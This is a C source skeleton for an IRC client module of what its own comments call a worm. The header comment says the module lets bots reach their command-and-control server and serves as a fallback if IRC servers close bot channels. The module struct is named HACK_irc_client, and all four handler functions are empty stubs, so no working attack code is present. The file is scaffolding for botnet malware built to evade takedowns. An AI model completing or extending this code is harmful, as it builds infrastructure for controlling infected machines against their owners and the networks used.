/*
irc support

this is going to be irc CLIENT support..

there will be a second module that is specifically for IRC server support
that module will be used to link irc->botlink->irc for bots..
it can be used as a backup in case people start closing irc servers due to bot communications
using it to connect to c&c

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include "list.h"
#include "structs.h"
#include "utils.h"
#include "irc.h"



IRC_Client_Connection *irc_client_list = NULL;

Modules HACK_irc_client = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    6667, 0,
    // required 0, 0..  
    0, 0,
    // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
    // we will run this every 5 seconds since we are a WORM
    5,
    // bitcoin functions
    &irc_client_funcs, NULL,
    // no magic bytes for portscan
    NULL, 0
};



// for port scanning.. we only care about nodes (starting new connections)
// and the main loop
ModuleFuncs irc_client_funcs = {
    NULL, NULL,
    &irc_client_incoming,
    &irc_client_outgoing,
    &irc_client_main_loop,
    &irc_client_connected,
    &irc_client_disconnect // no disconnect since we give away the connections..
};



// we must ensure connectivity, ping/pong, and determine whther any messages are in queue for distribution
// from p2p
int irc_client_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

// on connect we must generate nickname, user id, and real name
// and push to the server
int irc_client_connected(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}


int irc_client_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int irc_client_outgoing(Modules *mptr, Connection *cptr, char **buf, int *size) {
    
}